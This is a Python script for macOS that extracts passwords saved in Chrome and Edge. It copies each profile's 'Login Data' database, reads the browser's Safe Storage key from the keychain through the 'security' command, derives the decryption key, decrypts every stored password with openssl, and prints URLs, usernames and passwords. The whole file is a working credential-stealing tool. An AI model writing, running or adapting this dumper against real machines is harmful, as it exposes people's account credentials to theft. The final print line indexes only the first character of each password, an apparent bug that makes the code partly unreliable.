import sqlite3
import os
import binascii
import subprocess
import base64
import hashlib
import glob
import shutil


PATH = {
    'Chrome':   glob.glob(f'{os.path.expanduser("~")}/Library/Application Support/Google/Chrome/*/Login Data'),
    'Edge':     glob.glob(f'{os.path.expanduser("~")}/Library/Application Support/Microsoft Edge/*/Login Data')
}


def decrypt(encrypted_value, iv, key=None):
    if not key:
        raise Exception("key value should not be None!")

    hexKey = binascii.hexlify(key)
    hexEncPassword = base64.b64encode(encrypted_value[3:])
    try:
        encrypted = hexEncPassword.decode()
        decrypted = subprocess.check_output(
            f'openssl enc -base64 -d -aes-128-cbc -iv {iv} -K {hexKey.decode()} <<< {encrypted}',
            shell=True)
        decrypted = decrypted.decode()
    except Exception as e:
        decrypted = f'ERROR: retrieving password: {e}'
    return decrypted


def process(safeStorageKey, loginData):
    iv = ''.join(('20',) * 16)  # " " -> 띄어쓰기는 ascii code 상에서 32 번, 16진법으로는 20
    key = hashlib.pbkdf2_hmac('sha1', safeStorageKey, b'saltysalt', 1003)[:16]

    shutil.copy2(loginData, 'Loginvault.db')
    fd = os.open('Loginvault.db', os.O_RDONLY)
    database = sqlite3.connect('/dev/fd/%d' % fd)
    os.close(fd)

    sql = 'SELECT username_value, password_value, origin_url FROM logins'
    decryptedList = []

    with database:
        for user, encryptedPass, url in database.execute(sql):
            if user == "" or (encryptedPass[:3] != b'v10'):
                continue

            urlUserPassDecrypted = {
                'origin_url':    url,
                'username':      user,
                'password':      decrypt(encryptedPass, iv, key=key)
            }
            decryptedList.append(urlUserPassDecrypted)

    return decryptedList


def extract(browserType):
    if browserType not in ["Chrome", "Edge"]:
        raise Exception(f"It is not a selectable browser type: {browserType}")

    loginData = PATH.get(browserType)
    safeStorageKey = subprocess.check_output(
        f"security find-generic-password -wa {browserType}", shell=True).replace(b'\n', b'')

    if not safeStorageKey:
        raise Exception('ERROR: getting Chrome Safe Storage Key')

    for profile in loginData:
        for i, info in enumerate(process(safeStorageKey, f"{profile}")):
            # for string output's color
            default = "\033[0m"
            green = "\033[32m"
            bold = "\033[1m"

            result = (
                f"{green}[{(i+1)}]{default}{bold} \n"
                f"URL:   {info['origin_url']} \n"
                f"User:  {info['username']} \n"
                f"Pwd:   {info['password'][0]} \n {default}"
            )

            print(result)
